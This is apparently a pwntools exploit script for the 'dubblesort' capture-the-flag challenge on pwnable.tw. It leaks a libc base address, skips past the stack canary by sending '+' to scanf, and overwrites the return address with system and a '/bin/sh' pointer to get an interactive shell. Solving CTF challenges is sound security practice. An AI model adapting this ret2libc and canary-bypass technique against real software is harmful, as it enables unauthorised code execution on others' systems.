
from pwn import *
import sys

if __name__ == "__main__":

    if len(sys.argv) == 2:
        r = remote('chall.pwnable.tw', 10101)
    else:
        r = process('./dubblesort')
    
    
    libc = ELF('./libc_32.so.6')

    system = libc.symbols['system']
    binsh = 0x1562f5
    
    r.recvuntil(':')
    r.sendline('A'*0x18)
    r.recvuntil('\n')
    base = ((u32(r.recvuntil(',')[:4]) << 8) & 0xffffffff) - 0x1b0000
    log.info('libc: ' + hex(base))
    r.recvuntil(':') 

    r.sendline('36')
    for i in xrange(36):
        if i < 24:
            r.recvuntil(':')
            r.sendline(str(i))
        elif i == 24:
            r.recvuntil(':')
            r.sendline('+')
        elif i <= 32:
            r.recvuntil(':')
            r.sendline(str(base+system))
        elif i >= 33:
            r.recvuntil(':')
            r.sendline(str(base+binsh))

    r.interactive()
